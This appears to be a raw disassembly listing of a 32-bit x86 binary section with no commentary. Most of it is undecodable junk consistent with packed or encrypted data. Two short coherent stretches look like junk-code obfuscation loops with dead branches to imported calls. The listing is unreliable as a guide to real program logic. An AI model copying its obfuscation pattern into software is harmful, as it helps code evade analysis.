  40598c:	cmovne eax,DWORD PTR ds:[edi+0x5e]
  405991:	out    dx,eax
  405992:	jns    0x405964
  405994:	pop    si
  405996:	mov    ds:0x8258170c,eax
  40599b:	dec    edi
  40599c:	dec    ebp
  40599d:	sub    BYTE PTR [eax+ecx*1-0x7f612c1a],0xda
  4059a5:	jmp    FWORD PTR [edi-0x7e]
  4059a8:	enter  0xacb0,0x69
  4059ac:	adc    edx,DWORD PTR ds:0xf1f40454
  4059b2:	dec    ebp
  4059b3:	add    al,0x17
  4059b5:	ror    BYTE PTR [edx+edi*2+0x4c],0x64
  4059ba:	xchg   edx,eax
  4059bb:	fsub   st(4),st
  4059bd:	mov    DWORD PTR [ebx+0x5434e24f],edx
  4059c3:	cdq    
  4059c4:	or     al,0x77
  4059c6:	in     eax,0xe
  4059c8:	loopne 0x405a39
  4059ca:	mov    al,ds:0xce4ea8f0
  4059cf:	fmul   DWORD PTR [edi+0x7e890174]
  4059d5:	or     ch,bl
  4059d7:	jp     0x405972
  4059d9:	push   esi
  4059da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059db:	sub    al,0x37
  4059dd:	xchg   ebp,eax
  4059de:	sahf   
  4059df:	jge    0x4059c0
  4059e1:	loop   0x4059b2
  4059e3:	ficom  DWORD PTR [eax-0x6]
  4059e6:	or     DWORD PTR [ebx+0x7d],0xffffffeb
  4059ea:	or     BYTE PTR [ecx-0x22],bh
  4059ed:	pop    edx
  4059ee:	xor    esp,DWORD PTR [eax-0x7a]
  4059f1:	dec    edi
  4059f2:	js     0x4059ce
  4059f4:	retf   
  4059f5:	out    dx,eax
  4059f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059f7:	xchg   edx,eax
  4059f8:	jmp    0x405a4c
  4059fa:	je     0x405a42
  4059fc:	xor    edi,esp
  4059fe:	cmp    ah,BYTE PTR [esi+0x293646fb]
  405a04:	adc    DWORD PTR ds:0x8962743c,ebx
  405a0a:	pop    es
  405a0b:	inc    ebp
  405a0c:	mov    ebx,0x169b8b7d
  405a11:	adc    al,cl
  405a13:	(bad)  
  405a14:	pop    ecx
  405a15:	outs   dx,DWORD PTR ds:[esi]
  405a16:	repz mov al,ds:0x5a4b40fa
  405a1c:	vsqrtss xmm5,xmm7,DWORD PTR [edx]
  405a20:	sub    eax,0x8485ccb3
  405a25:	test   esp,eax
  405a27:	lds    edx,FWORD PTR [ebx-0x9d5f77a]
  405a2d:	loopne 0x405a18
  405a2f:	imul   eax,DWORD PTR [esi],0x7f
  405a32:	mov    esp,0xc493c220
  405a37:	(bad)  
  405a38:	int    0x4e
  405a3a:	std    
  405a3b:	test   al,0xc2
  405a3d:	mov    bh,0x59
  405a3f:	outs   dx,BYTE PTR ds:[esi]
  405a40:	call   0x74df:0x3b785f92
  405a47:	xlat   BYTE PTR ds:[ebx]
  405a48:	add    eax,0xbc4b4d9d
  405a4d:	inc    ecx
  405a4e:	out    0xd2,eax
  405a50:	push   esi
  405a51:	inc    esp
  405a52:	repnz out dx,al
  405a54:	nop
  405a55:	sub    esi,DWORD PTR [eax*1-0x96e858b]
  405a5c:	sahf   
  405a5d:	push   es
  405a5e:	outs   dx,DWORD PTR ds:[esi]
  405a5f:	es xchg ebx,eax
  405a61:	(bad)  
  405a62:	mov    ebp,0xa6ee7b88
  405a67:	loop   0x405a12
  405a69:	pop    ebx
  405a6a:	mov    dh,ch
  405a6c:	xor    al,0x22
  405a6e:	les    ebx,FWORD PTR [edx+eiz*2+0x6b]
  405a72:	mov    ah,0x47
  405a74:	sub    ah,BYTE PTR [edx-0x72]
  405a77:	test   DWORD PTR [edx-0x4d],esp
  405a7a:	mov    ah,0x6e
  405a7c:	call   0xb7e2:0x32bb181c
  405a83:	cmp    eax,0x547c9177
  405a88:	outs   dx,BYTE PTR ds:[esi]
  405a89:	mov    eax,ds:0xaf72c8a8
  405a8e:	inc    esp
  405a8f:	push   ebx
  405a90:	das    
  405a91:	xor    DWORD PTR [ecx],0x55
  405a94:	test   ecx,ebx
  405a96:	sar    bl,cl
  405a98:	mov    WORD PTR [edi+0x47],cs
  405a9b:	mov    edi,esp
  405a9d:	stos   BYTE PTR es:[edi],al
  405a9e:	test   al,0xa7
  405aa0:	sub    al,dl
  405aa2:	sub    eax,0x11b120d8
  405aa7:	mov    ds:0xdea9975,eax
  405aac:	stc    
  405aad:	inc    ecx
  405aae:	or     dl,BYTE PTR [edi]
  405ab0:	sub    al,0x13
  405ab2:	cwde   
  405ab3:	pushf  
  405ab4:	test   eax,0x882c2d18
  405ab9:	adc    eax,0xf26a10e8
  405abe:	mov    DWORD PTR [ebx],ebp
  405ac0:	mov    ecx,0x2a7644f9
  405ac5:	and    al,ah
  405ac7:	bound  ecx,QWORD PTR [ebx-0x577f61c0]
  405acd:	ss pop ecx
  405acf:	cmc    
  405ad0:	or     BYTE PTR [edi-0x5afc7234],ah
  405ad6:	and    edx,eax
  405ad8:	fisttp WORD PTR [ebp+0x47e36cd8]
  405ade:	jbe    0x405afd
  405ae0:	push   ss
  405ae1:	and    ebx,DWORD PTR [ebp-0x73dcbc6e]
  405ae7:	icebp  
  405ae8:	fnstsw WORD PTR [edx+0x37f6c3b3]
  405aee:	and    DWORD PTR [esi-0x1e],edi
  405af1:	dec    edi
  405af2:	pop    esi
  405af3:	lahf   
  405af4:	mov    cl,ah
  405af6:	push   DWORD PTR [eax*8-0x515c5396]
  405afd:	out    dx,eax
  405afe:	fldcw  WORD PTR [eax]
  405b00:	add    BYTE PTR [esi-0x6],ah
  405b03:	les    cx,DWORD PTR [edx-0x7ed64f2f]
  405b0a:	mov    esi,0xced7245c
  405b0f:	rcl    BYTE PTR [ebp+ecx*4-0x2be25f03],cl
  405b16:	ss xchg esi,eax
  405b18:	pop    edx
  405b19:	sub    edx,esi
  405b1b:	scas   eax,DWORD PTR es:[edi]
  405b1c:	cmc    
  405b1d:	mov    ah,0x95
  405b1f:	pop    esi
  405b20:	mov    al,ds:0x8512459b
  405b25:	pop    ds
  405b26:	retf   
  405b27:	arpl   WORD PTR [ebp+0x34],bp
  405b2a:	xlat   BYTE PTR ds:[ebx]
  405b2b:	hlt    
  405b2c:	dec    ecx
  405b2d:	xchg   edx,eax
  405b2e:	sbb    BYTE PTR [edi],al
  405b30:	add    BYTE PTR [ecx-0x5c2a379b],ah
  405b36:	outs   dx,DWORD PTR ds:[esi]
  405b37:	test   eax,0xa65ff575
  405b3c:	ins    DWORD PTR es:[edi],dx
  405b3d:	int    0xdd
  405b3f:	inc    eax
  405b40:	call   0x625c:0xa63a97aa
  405b47:	shl    DWORD PTR [eax-0x2],cl
  405b4a:	push   edx
  405b4b:	fnstsw WORD PTR [ebx+eiz*8-0x6c5d0935]
  405b52:	cli    
  405b53:	sub    edx,esi
  405b55:	xchg   ecx,eax
  405b57:	in     al,dx
  405b58:	xchg   DWORD PTR [ebx+0x23b6ea48],esp
  405b5e:	in     al,0x7b
  405b60:	jo     0x405aef
  405b62:	pop    esp
  405b63:	mov    esp,ds
  405b65:	push   edi
  405b66:	dec    eax
  405b68:	sahf   
  405b69:	out    0x5b,eax
  405b6b:	mov    ah,0x60
  405b6d:	dec    ecx
  405b6e:	add    edi,ecx
  405b70:	pop    ebx
  405b71:	sbb    al,dl
  405b73:	(bad)  [esi-0x5]
  405b76:	adc    BYTE PTR [eax-0x8bfd725],0x18
  405b7d:	push   ds
  405b7e:	repnz iret 
  405b80:	cmp    al,0x3e
  405b82:	fld    DWORD PTR [eax-0x454171ce]
  405b88:	outs   dx,DWORD PTR ds:[esi]
  405b89:	mov    esp,DWORD PTR [ecx+ebp*8-0x4ba3889e]
  405b90:	or     al,0xfa
  405b92:	mov    ebx,0x50f466bf
  405b97:	dec    edi
  405b98:	push   cs
  405b99:	div    DWORD PTR [ecx-0x70]
  405b9c:	js     0x405b1e
  405b9e:	rcl    BYTE PTR [ebp-0x4a],1
  405ba1:	fcmovne st,st(1)
  405ba3:	cmp    DWORD PTR [ebx-0x59],edi
  405ba6:	inc    esi
  405ba7:	or     al,0x3e
  405ba9:	cld    
  405baa:	add    eax,0xc5d61352
  405baf:	ins    BYTE PTR es:[edi],dx
  405bb0:	jne    0x405bf2
  405bb2:	mul    DWORD PTR ds:0x974e280e
  405bb8:	(bad)  
  405bb9:	(bad)  
  405bba:	lock mov bl,0xef
  405bbd:	pop    ecx
  405bbe:	pop    edx
  405bbf:	mov    dl,0x88
  405bc1:	jle    0x405b5f
  405bc3:	adc    ah,0xc9
  405bc6:	icebp  
  405bc7:	retf   0x36f2
  405bca:	test   DWORD PTR [eax-0x37ce3bf4],edx
  405bd0:	(bad)  
  405bd1:	test   DWORD PTR [esi+0x8913648],edx
  405bd7:	mov    eax,0xc9a2b4a3
  405bdc:	je     0x405c2f
  405bde:	out    dx,al
  405bdf:	adc    DWORD PTR [ebx+0x7c],eax
  405be2:	and    BYTE PTR [ebp-0x3e5497a],bl
  405be8:	imul   eax,DWORD PTR [edi+0x48d7fd4e],0x8ea72cee
  405bf2:	lahf   
  405bf3:	jmp    0x1fade552
  405bf8:	retf   0x3157
  405bfb:	cs out 0x9e,al
  405bfe:	sbb    DWORD PTR [ebp+0x6c],ebp
  405c01:	loope  0x405c3d
  405c03:	sbb    BYTE PTR [eax],ch
  405c05:	push   edi
  405c06:	fwait
  405c07:	sti    
  405c08:	(bad)  
  405c0a:	ret    
  405c0b:	sbb    al,0xa3
  405c0d:	out    0xc1,al
  405c0f:	xchg   ecx,eax
  405c10:	jp     0x405c08
  405c12:	mov    esi,DWORD PTR [eax]
  405c14:	inc    esi
  405c15:	loopne 0x405c59
  405c17:	sbb    BYTE PTR [eax],ch
  405c19:	sti    
  405c1a:	mov    ecx,DWORD PTR ds:[esi-0xf879ede]
  405c21:	or     esi,DWORD PTR [eax]
  405c23:	mov    ecx,0x9eeb7db
  405c28:	push   ebx
  405c29:	fnstcw WORD PTR [ebx-0x4d]
  405c2c:	es jle 0x405c0b
  405c2f:	scas   al,BYTE PTR es:[edi]
  405c30:	dec    edx
  405c31:	mov    ebp,0x69ed4d98
  405c36:	pop    ss
  405c37:	test   BYTE PTR [eax],dh
  405c39:	mov    esp,0xb75835bf
  405c3e:	inc    ebp
  405c3f:	call   0x7d741961
  405c44:	inc    esp
  405c45:	push   edx
  405c46:	add    cl,0xc9
  405c49:	cmc    
  405c4a:	add    edi,DWORD PTR [eax]
  405c4c:	and    esi,DWORD PTR [eax]
  405c4e:	repnz fcomip st,st(5)
  405c51:	fwait
  405c52:	jp     0x405c18
  405c54:	hlt    
  405c55:	cmp    BYTE PTR [edx+0x5c616115],bh
  405c5b:	pop    eax
  405c5c:	loope  0x405ca4
  405c5e:	fld    DWORD PTR [ecx+ebp*2+0x5757f53e]
  405c65:	les    edx,FWORD PTR [ecx+0x61f93f45]
  405c6b:	xchg   ebx,eax
  405c6c:	inc    esi
  405c6d:	mov    al,ds:0xc27a3cf
  405c72:	push   ss
  405c73:	push   edi
  405c74:	jo     0x405c93
  405c76:	add    bl,bl
  405c78:	mov    esp,0x5f0d15ab
  405c7d:	(bad)  
  405c7e:	repz pop es
  405c80:	mov    ebp,0xcac146f
  405c85:	pop    eax
  405c86:	cmp    eax,ecx
  405c88:	mov    dh,0x81
  405c8a:	jl     0x405ce1
  405c8c:	outs   dx,BYTE PTR ds:[esi]
  405c8d:	inc    esi
  405c8e:	nop
  405c8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c90:	repnz fcmovne st,st(1)
  405c93:	retf   0x341b
  405c96:	bnd jo 0x405cfd
  405c99:	push   ss
  405c9a:	enter  0x3214,0x67
  405c9e:	mov    ch,0xf5
  405ca0:	sub    ecx,DWORD PTR [esi+edi*1+0x73]
  405ca4:	bound  edi,QWORD PTR [eax-0x7cde52d8]
  405caa:	xor    cl,ch
  405cac:	xchg   ecx,eax
  405cad:	xchg   esi,eax
  405cae:	lds    edx,FWORD PTR [edx+0x72]
  405cb1:	daa    
  405cb2:	cld    
  405cb3:	jmp    0xebc93785
  405cb8:	jbe    0x405d23
  405cba:	imul   edi,DWORD PTR [ebx+edi*2-0x7f],0x31
  405cbf:	pushf  
  405cc0:	mov    ecx,0xd4ed987a
  405cc5:	in     al,0xb7
  405cc7:	in     eax,0xed
  405cc9:	cmp    ecx,eax
  405ccb:	jne    0x4060e3
  405cd1:	add    DWORD PTR ds:0x43453f,edx
  405cd7:	mov    ax,WORD PTR [ebp-0x8]
  405cdb:	and    DWORD PTR ds:0x434553,0x43457b
  405ce5:	mov    ecx,0x8a38
  405cea:	sub    DWORD PTR ds:0x43460f,0x30d0
  405cf4:	xor    ax,cx
  405cf7:	or     ecx,0x3ba0
  405cfd:	mov    ecx,0x3afe
  405d02:	and    DWORD PTR ds:0x4345c7,0x6a78
  405d0c:	add    ax,cx
  405d0f:	mov    DWORD PTR ds:0x434547,0x12
  405d19:	cmp    DWORD PTR ds:0x434547,0x0
  405d20:	je     0x405d51
  405d26:	cmp    DWORD PTR ds:0x434547,0x13
  405d2d:	jne    0x405d3f
  405d33:	push   DWORD PTR [ebp-0x1c]
  405d36:	push   DWORD PTR [ebp-0x10]
  405d39:	call   DWORD PTR ds:0x413284
  405d3f:	mov    ecx,DWORD PTR ds:0x434547
  405d45:	dec    ecx
  405d46:	mov    DWORD PTR ds:0x434547,ecx
  405d4c:	jmp    0x405d19
  405d51:	mov    ecx,DWORD PTR [ebp+0x8]
  405d54:	movzx  eax,ax
  405d57:	not    eax
  405d59:	and    eax,DWORD PTR [ecx]
  405d5b:	mov    ecx,DWORD PTR [ebp+0x8]
  405d5e:	mov    DWORD PTR [ecx],eax
  405d60:	jmp    0x405d6c
  405d65:	xor    DWORD PTR [ebp-0x4],0xe149ebf
  405d6c:	mov    ax,WORD PTR [ebp-0x8]
  405d70:	push   DWORD PTR [ebp+0x8]
  405d73:	call   0x4060e7
  405d78:	test   eax,eax
  405d7a:	jmp    0x4060dd
  405d7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d80:	jb     0x405db6
  405d82:	push   ebp
  405d83:	cld    
  405d84:	pop    ebp
  405d85:	gs jae 0x405d28
  405d88:	call   0x92611bd6
  405d8d:	clc    
  405d8e:	jb     0x405d45
  405d90:	cmp    al,0x7e
  405d92:	jle    0x405d58
  405d94:	jns    0x405e14
  405d96:	jle    0x405d44
  405d98:	push   ecx
  405d99:	push   0xbc51bf1b
  405d9e:	scas   eax,DWORD PTR es:[edi]
  405d9f:	push   0x5b
  405da1:	jmp    0x405df4
  405da3:	cwde   
  405da4:	or     DWORD PTR [ebx],edi
  405da6:	mov    es,WORD PTR ds:0x8608f58
  405dac:	adc    eax,DWORD PTR [ecx-0x26be8e7d]
  405db2:	adc    al,0xec
  405db4:	xor    BYTE PTR [ebp+0x3ab4445c],cl
  405dba:	(bad)  
  405dbb:	shr    BYTE PTR [ecx-0x7b6804d8],1
  405dc1:	loope  0x405d9f
  405dc3:	xor    eax,DWORD PTR [eax]
  405dc5:	push   ds
  405dc6:	(bad)  
  405dc7:	fucom  st(1)
  405dc9:	ja     0x405d86
  405dcb:	cli    
  405dcc:	mov    edx,0x42b0a783
  405dd1:	xchg   DWORD PTR es:[ebp+0x58],ecx
  405dd5:	les    esi,FWORD PTR [ebx+0x1871ca48]
  405ddb:	cmp    esi,edi
  405ddd:	lahf   
  405dde:	in     al,dx
  405ddf:	add    al,0x45
  405de1:	xchg   ebp,eax
  405de2:	ret    
  405de3:	adc    BYTE PTR [edx+0x4a61ee51],cl
  405de9:	in     al,dx
  405dea:	push   0x11c62f4e
  405def:	cmp    al,0xf
  405df1:	cmp    al,0x88
  405df3:	dec    esp
  405df4:	add    al,BYTE PTR [ebx-0x34]
  405df7:	lods   al,BYTE PTR ds:[esi]
  405df8:	push   ds
  405df9:	in     al,dx
  405dfa:	into   
  405dfb:	jmp    0x781275f9
  405e00:	pop    esp
  405e01:	popf   
  405e02:	das    
  405e03:	icebp  
  405e04:	jp     0x405de7
  405e06:	xchg   edi,eax
  405e07:	cmc    
  405e08:	cwde   
  405e09:	fist   WORD PTR [esi+0x599be6b9]
  405e0f:	aaa    
  405e10:	mov    ch,0x3b
  405e12:	or     ecx,DWORD PTR [esi+ecx*1]
  405e15:	xchg   esi,eax
  405e16:	pusha  
  405e17:	and    DWORD PTR [ecx],edi
  405e19:	sti    
  405e1a:	push   esi
  405e1b:	xchg   ebp,eax
  405e1c:	call   0x5458:0xbf71f402
  405e23:	dec    esp
  405e24:	jmp    0x5f91:0x67dd39a9
  405e2b:	inc    edx
  405e2c:	mov    al,ds:0xfae44ce5
  405e31:	imul   esp,DWORD PTR [eax+0x6eaa23d4],0xe11305ca
  405e3b:	xor    al,cl
  405e3d:	out    0x5c,al
  405e3f:	aaa    
  405e40:	mov    dh,0xc2
  405e42:	in     eax,0x96
  405e44:	dec    ecx
  405e45:	and    al,0x72
  405e47:	xor    al,0xd7
  405e49:	addr16 xchg esi,eax
  405e4b:	push   ds
  405e4c:	sub    DWORD PTR [edx],0x282df2fc
  405e52:	pop    edi
  405e53:	rol    DWORD PTR [edi-0x59],cl
  405e56:	push   ss
  405e57:	stos   BYTE PTR es:[edi],al
  405e58:	scas   eax,DWORD PTR es:[edi]
  405e59:	pop    esi
  405e5a:	sub    eax,0x57b0f228
  405e5f:	call   0xdfa6:0x4ed69e08
  405e66:	int3   
  405e67:	leave  
  405e68:	loope  0x405ea6
  405e6a:	sbb    dl,ah
  405e6c:	sbb    ah,BYTE PTR [esi+ecx*1]
  405e6f:	ins    BYTE PTR es:[edi],dx
  405e70:	ja     0x405ebd
  405e72:	(bad)
  405e75:	fucom  st(1)
  405e77:	pushf  
  405e78:	or     DWORD PTR [eax+edi*1+0x3659c2f1],ecx
  405e7f:	js     0x405e16
  405e81:	aam    0x8f
  405e83:	fcmovb st,st(6)
  405e85:	inc    esp
  405e86:	stos   BYTE PTR es:[edi],al
  405e87:	mov    esi,0xe6007dc0
  405e8c:	push   esi
  405e8d:	pop    edx
  405e8e:	pop    esp
  405e8f:	push   esp
  405e90:	xor    dl,cl
  405e92:	xor    ch,BYTE PTR [ebx]
  405e94:	mov    edx,0x20abbede
  405e99:	or     al,0xd0
  405e9b:	or     edx,edx
  405e9d:	aam    0x80
  405e9f:	cmp    eax,0xd1846f8
  405ea4:	(bad)  
  405ea5:	cmp    ebx,DWORD PTR [ecx+0x3544732a]
  405eab:	jno    0x405efd
  405ead:	xchg   ebp,eax
  405eae:	mov    BYTE PTR [ebp-0x1],bh
  405eb1:	push   edi
  405eb2:	mov    al,ds:0x2bc74c26
  405eb7:	push   ds
  405eb8:	gs fs sbb bl,bl
  405ebc:	sbb    DWORD PTR [edx+0x25ccbc45],0xce9c0887
  405ec6:	jns    0x405e7f
  405ec8:	xlat   BYTE PTR ds:[ebx]
  405ec9:	scas   al,BYTE PTR es:[edi]
  405eca:	pop    ebx
  405ecb:	lahf   
  405ecc:	xlat   BYTE PTR ds:[ebx]
  405ecd:	jg     0x405e51
  405ecf:	push   edx
  405ed0:	dec    eax
  405ed1:	xor    edi,DWORD PTR [ebp-0x6d]
  405ed4:	or     esp,edx
  405ed6:	xchg   edi,eax
  405ed7:	inc    ebp
  405ed8:	std    
  405ed9:	add    al,0xd6
  405edb:	ret    0xc734
  405ede:	push   ebx
  405edf:	outs   dx,DWORD PTR ds:[esi]
  405ee0:	imul   ebp,DWORD PTR [ebx-0x322da081],0x57e5fa18
  405eea:	stc    
  405eeb:	jg     0x405e89
  405eed:	sub    ebp,esi
  405eef:	mov    ds:0xa719578b,al
  405ef4:	lahf   
  405ef5:	push   esp
  405ef6:	in     eax,0xfa
  405ef8:	mov    ch,0xc6
  405efa:	mov    cl,BYTE PTR [edx+ebp*4]
  405efd:	mov    esp,0x518f75c7
  405f02:	(bad)
  405f06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f07:	gs jns 0x405f35
  405f0a:	adc    ecx,esp
  405f0c:	mov    edi,0xa6e0cad5
  405f11:	mov    bl,0x42
  405f13:	enter  0xcde1,0xd9
  405f17:	popf   
  405f18:	push   esp
  405f19:	lds    edi,FWORD PTR [eax-0x27]
  405f1c:	adc    edx,DWORD PTR [edi+0x46]
  405f1f:	add    ecx,DWORD PTR [eax]
  405f21:	call   0xd093af06
  405f26:	outs   dx,DWORD PTR ds:[esi]
  405f27:	dec    esp
  405f28:	and    ch,bh
  405f2a:	jns    0x405f69
  405f2c:	adc    BYTE PTR [ebp-0x34],0xe3
  405f30:	popf   
  405f31:	(bad)  
  405f32:	mov    eax,0x36887a76
  405f37:	bound  ecx,QWORD PTR [eax+0x3dee5f3d]
  405f3d:	xchg   DWORD PTR [ecx+eax*2],edi
  405f40:	mov    ecx,0xbc67eba7
  405f45:	mov    bl,0x2b
  405f47:	cs cmp eax,0x68035a27
  405f4d:	mov    eax,0x521ac6c7
  405f52:	cmp    ebp,DWORD PTR [ebp+edi*2+0x2a1cace0]
  405f59:	xor    al,0x54
  405f5b:	dec    eax
  405f5c:	repz das 
  405f5e:	fnstsw WORD PTR [edx-0x36646473]
  405f64:	and    bh,BYTE PTR [ecx-0x71]
  405f67:	push   es
  405f68:	iret   
  405f69:	xlat   BYTE PTR ds:[ebx]
  405f6a:	cld    
  405f6b:	adc    DWORD PTR [esi],esi
  405f6d:	ror    BYTE PTR [esp],0xbc
  405f71:	push   eax
  405f72:	out    0x99,al
  405f74:	sbb    bh,cl
  405f76:	xchg   edx,eax
  405f77:	ds inc esi
  405f79:	mov    ch,0x90
  405f7b:	ret    0x877c
  405f7e:	fimul  DWORD PTR [ebx-0x77cb4559]
  405f84:	and    al,0xd5
  405f86:	retf   
  405f87:	scas   eax,DWORD PTR es:[edi]
  405f88:	pusha  
  405f89:	out    dx,eax
  405f8a:	xlat   BYTE PTR ds:[ebx]
  405f8b:	sub    esi,DWORD PTR [edx-0x13]
  405f8e:	cld    
  405f8f:	hlt    
  405f90:	out    0xdb,eax
  405f92:	jl     0x405fd3
  405f94:	cmp    cl,BYTE PTR [ecx-0x7f07d684]
  405f9a:	push   ebx
  405f9b:	mov    bl,0xeb
  405f9d:	retf   
  405f9e:	and    BYTE PTR [ebp+esi*1-0x24],dl
  405fa2:	jns    0x405ffe
  405fa4:	or     BYTE PTR [edx+0xd],al
  405fa7:	scas   eax,DWORD PTR es:[edi]
  405fa8:	int    0xc
  405faa:	and    DWORD PTR [ecx],0x3d
  405fad:	adc    esi,DWORD PTR [ebx-0x49995571]
  405fb3:	adc    eax,DWORD PTR [ebx]
  405fb5:	mov    cl,0x87
  405fb7:	xchg   esi,eax
  405fb8:	mov    esi,0xcf19c35d
  405fbd:	sbb    BYTE PTR [ebx+0x4a798826],dh
  405fc3:	ficom  WORD PTR [edi+0x5]
  405fc6:	adc    BYTE PTR [ecx+0x64723140],dl
  405fcc:	popa   
  405fcd:	dec    ebp
  405fce:	and    esp,DWORD PTR [esp+edi*4+0x6a9c671d]
  405fd5:	adc    eax,0xa90661c8
  405fda:	and    BYTE PTR [edx],ch
  405fdc:	jbe    0x405fc5
  405fde:	mov    eax,ds:0xff83af23
  405fe3:	(bad)  
  405fe4:	popf   
  405fe5:	retf   
  405fe6:	sar    BYTE PTR [ebx-0x134db867],1
  405fec:	int3   
  405fed:	nop
  405fee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405fef:	add    ch,bl
  405ff1:	xor    DWORD PTR [edx+0x3fcbdf1e],edi
  405ff7:	push   ebp
  405ff8:	and    DWORD PTR [bp+0x6b85],edi
  405ffd:	rcl    esp,0x2c
  406000:	clc    
  406001:	and    al,0x21
  406003:	xor    DWORD PTR [edx+ebx*8-0x4a49ac2],eax
  40600a:	sbb    BYTE PTR [ecx],0x21
  40600d:	xor    esp,DWORD PTR [edi]
  40600f:	mov    al,ds:0xf1e3b9b8
  406014:	aaa    
  406015:	jo     0x406054
  406017:	inc    ebx
  406018:	lea    ecx,[ebp+0x366efab5]
  40601e:	data16 ja 0x406082
  406021:	pop    ebx
  406022:	pop    ss
  406023:	mov    ds:0xac544bf,al
  406028:	and    BYTE PTR [ecx-0x3a],cl
  40602b:	and    bl,al
  40602d:	mov    es,esp
  40602f:	cmp    al,cl
  406031:	xor    BYTE PTR [ecx+eax*4-0x6c],al
  406035:	mov    eax,ds:0xf1bf25f6
  40603a:	inc    ebx
  40603b:	jnp    0x406007
  40603d:	imul   esp,DWORD PTR [esi+0x7e76ca17],0xb1c70b92
  406047:	sbb    ch,BYTE PTR [esi+0x16]
  40604a:	mov    al,0x47
  40604c:	ins    DWORD PTR es:[edi],dx
  40604d:	loopne 0x4060ba
  40604f:	sub    BYTE PTR [esi],0xd2
  406052:	popf   
  406053:	(bad)  
  406054:	daa    
  406055:	xlat   BYTE PTR ds:[ebx]
  406056:	and    esp,ecx
  406058:	jnp    0x406011
  40605a:	mov    ebx,0x42a3ac91
  40605f:	jle    0x40605e
  406061:	pop    edi
  406062:	rol    dl,cl
  406064:	repz cwde 
  406066:	ins    DWORD PTR es:[edi],dx
  406067:	ss pop ecx
  406069:	inc    sp
  40606b:	aad    0x8d
  40606d:	mov    eax,ds:0x6f2f8005
  406072:	lds    edx,FWORD PTR [esi]
  406074:	mov    bl,0x49
  406076:	push   es
  406077:	jb     0x406071
  406079:	stos   DWORD PTR es:[edi],eax
  40607a:	lock jne 0x40600b
  40607d:	fiadd  WORD PTR [ebp+0x5a68ea79]
  406083:	les    edi,FWORD PTR [ecx-0xb2f806]
  406089:	push   eax
  40608a:	mov    ds:0x2e4e8cd1,al
  40608f:	pop    edi
  406090:	ror    BYTE PTR [ebp-0x4de2a6a5],0xbd
  406097:	or     al,0x31
  406099:	stc    
  40609a:	sbb    al,al
  40609c:	or     DWORD PTR [ebx-0x33246510],edx
  4060a2:	test   BYTE PTR [edi+0x14c3cd34],cl
  4060a8:	push   cs
  4060a9:	mov    al,ds:0xd951fcd2
  4060ae:	mov    dl,0xe3
  4060b0:	test   eax,0xccc089ee
  4060b5:	out    0x9e,al
  4060b7:	or     dl,BYTE PTR fs:[edi+0x22e1b1a8]
  4060be:	jge    0x40605b
  4060c0:	push   edx
  4060c1:	cmp    eax,0x46c2bbfc
  4060c6:	inc    eax
  4060c7:	adc    bl,BYTE PTR [eax-0x5338e037]
  4060cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060ce:	shr    DWORD PTR [edi-0x44cd2f3a],0x3b
  4060d5:	xor    BYTE PTR [ecx],dh
  4060d7:	sub    BYTE PTR [ebp+0x25],dh
  4060da:	addr16 and eax,0x82840f24
  4060e0:	cld    
  4060e1:	(bad)  
  4060e2:	dec    ecx
  4060e4:	ret    0x4
  4060e7:	push   ebp
  4060e8:	mov    ebp,esp
  4060ea:	sub    esp,0x2c
  4060ed:	mov    DWORD PTR [ebp-0x8],0xf89c8539
  4060f4:	mov    DWORD PTR [ebp-0x14],0xf89c8536
  4060fb:	mov    ecx,DWORD PTR ds:0x43456f
  406101:	mov    eax,ds:0x43461b
  406106:	sub    eax,ecx
  406108:	add    ecx,DWORD PTR [ecx+eax*1]
  40610b:	mov    eax,0x9577
  406110:	and    DWORD PTR ds:0x434553,0x0
  40611a:	jmp    0x40612c
  40611f:	mov    ecx,DWORD PTR ds:0x434553
  406125:	inc    ecx
  406126:	mov    DWORD PTR ds:0x434553,ecx
  40612c:	cmp    DWORD PTR ds:0x434553,0x15
  406133:	jae    0x40615a
  406139:	cmp    DWORD PTR ds:0x434553,0x17
  406140:	jne    0x40614f
  406146:	push   DWORD PTR [ebp-0x10]
  406149:	call   DWORD PTR ds:0x4130c0
  40614f:	jmp    0x40611f
  406154:	adc    DWORD PTR ds:0x434537,edx
  40615a:	mov    WORD PTR [ebp-0x4],ax
  40615e:	and    DWORD PTR ds:0x43457b,0x0
  406168:	mov    ecx,DWORD PTR ds:0x43457b
  40616e:	inc    ecx
  40616f:	mov    DWORD PTR ds:0x43457b,ecx
  406175:	cmp    DWORD PTR ds:0x43457b,0x5
  40617c:	jne    0x40618b
  406182:	push   DWORD PTR [ebp-0x10]
  406185:	call   DWORD PTR ds:0x4133fc
  40618b:	cmp    DWORD PTR ds:0x43457b,0x4
  406192:	jne    0x4061a7
  406198:	xor    ecx,ecx
  40619a:	or     ecx,DWORD PTR ds:0x43457b
  4061a0:	inc    ecx
  4061a1:	mov    DWORD PTR ds:0x43457b,ecx
  4061a7:	cmp    DWORD PTR ds:0x43457b,0x1f
  4061ae:	jb     0x406168
  4061b4:	jmp    0x4065a2
  4061b9:	and    bl,al
  4061bb:	ss cmp ch,bh
  4061be:	cmc    
  4061bf:	lock jecxz 0x406145
  4061c2:	sahf   
  4061c3:	rol    ebp,1
  4061c5:	adc    DWORD PTR ss:[edx],esp
  4061c8:	jle    0x40623d
  4061ca:	aas    
  4061cb:	jle    0x40624b
  4061cd:	dec    edi
  4061ce:	jns    0x40624e
  4061d0:	jle    0x4061c3
  4061d2:	inc    edi
  4061d3:	jbe    0x4061d0
  4061d5:	je     0x406175
  4061d7:	push   eax
  4061d8:	push   esp
  4061d9:	fadd   QWORD PTR [edi+eiz*4+0x22480cb7]
  4061e0:	jae    0x4061a5
  4061e2:	jl     0x406215
  4061e4:	jg     0x4061c8
  4061e6:	mov    eax,0xecbc9bc8
  4061eb:	sub    al,0x4d
  4061ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4061ee:	pop    ebp
  4061ef:	enter  0x4e89,0x3a
  4061f3:	inc    eax
  4061f4:	(bad)  
  4061f5:	cld    
  4061f6:	mov    DWORD PTR [edi-0x5767d3a2],esp
  4061fc:	xchg   esi,eax
  4061fd:	outs   dx,BYTE PTR ds:[esi]
